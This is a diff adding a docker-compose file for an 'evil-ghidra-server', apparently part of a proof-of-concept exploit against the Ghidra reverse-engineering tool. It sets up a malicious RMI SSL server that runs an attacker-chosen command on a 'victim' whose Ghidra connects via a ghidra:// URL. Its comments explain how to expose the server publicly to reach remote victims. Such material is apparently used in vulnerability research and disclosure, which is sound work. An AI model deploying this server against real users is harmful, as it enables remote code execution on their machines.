@@ -1,0 +1,19 @@
+services:
+  evil-ghidra-server:
+    build:
+      # Build context is poc/ so the Dockerfile can COPY exploit/*.java in.
+      context: ..
+      dockerfile: docker/Dockerfile
+    image: evil-ghidra-server:latest
+    container_name: evil-ghidra-server
+    environment:
+      # Command to execute on the victim.  demo.sh exports this from --cmd
+      # or the .armed_cmd stash; override directly here if running manually:
+      CMD: "${CMD:?CMD is required (e.g. 'open -a Calculator')}"
+      PORT: "${PORT:-13100}"
+    ports:
+      # Expose to the host so a locally-running Ghidra can reach ghidra://
+      # localhost:13100/.  For a remote victim, bind to a public interface
+      # or run this container on a routable host.
+      - "${PORT:-13100}:13100"      # RMI SSL registry
+      - "${PORT2:-13101}:13101"     # RMI SSL probe port
